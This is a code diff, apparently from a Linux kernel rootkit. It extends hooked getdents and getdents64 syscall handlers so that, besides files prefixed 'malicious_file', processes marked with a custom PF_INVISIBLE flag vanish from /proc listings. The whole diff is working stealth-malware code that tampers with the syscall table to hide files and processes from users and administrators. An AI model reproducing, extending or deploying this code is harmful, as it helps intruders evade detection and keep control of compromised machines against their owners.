@@ -10,6 +10,7 @@
 #endif
 #define MAGIC_PREFIX "malicious_file"
 
+#define PF_INVISIBLE 0x10000000
 
 #include "../hooking.h"
 #include "h_getdents.h"
@@ -19,22 +20,36 @@ sysfun_t orig_getdents64;
 
 long new_getdents64(const struct pt_regs *pt_regs)
 {
+    int fd = (int) pt_regs->di;
     struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
     int ret = orig_getdents64(pt_regs), err;
     unsigned long off = 0;
+    unsigned short proc = 0;
     struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
+
     if (ret <= 0)
         return ret;
+
     kdirent = kzalloc(ret, GFP_KERNEL);
     if (kdirent == NULL)
         return ret;
+
     err = copy_from_user(kdirent, dirent, ret);
     if (err)
         goto out;
+
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+    proc = 1;
+
     while (off < ret)
     {
         dir = (void *)kdirent + off;
-        if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
+        if ((!proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
         {
             if (dir == kdirent)
             {
@@ -58,22 +73,38 @@ out:
 
 long new_getdents(const struct pt_regs *pt_regs)
 {
+    int fd = (int) pt_regs->di;
     struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
     int ret = orig_getdents(pt_regs), err;
     unsigned long off = 0;
+    unsigned short proc = 0;
     struct linux_dirent *dir, *kdirent, *prev = NULL;
+    struct inode *d_inode;
+
     if (ret <= 0)
         return ret;
+
     kdirent = kzalloc(ret, GFP_KERNEL);
     if (kdirent == NULL)
         return ret;
+
     err = copy_from_user(kdirent, dirent, ret);
     if (err)
         goto out;
+
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+    /*&& MINOR(d_inode->i_rdev) == 1*/)
+    proc = 1;
+
     while (off < ret)
     {
         dir = (void *)kdirent + off;
-        if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
+        if ((!proc && 
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
         {
             if (dir == kdirent)
             {
@@ -120,4 +151,27 @@ void restore_getdents(void)
     syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 
     protect_memory(old_cr0);
+}
+
+struct task_struct * find_task(pid_t pid)
+{
+	struct task_struct *p = current;
+	for_each_process(p) {
+		if (p->pid == pid)
+			return p;
+	}
+	return NULL;
+}
+
+int is_invisible(pid_t pid)
+{
+	struct task_struct *task;
+	if (!pid)
+		return 0;
+	task = find_task(pid);
+	if (!task)
+		return 0;
+	if (task->flags & PF_INVISIBLE)
+		return 1;
+	return 0;
 }
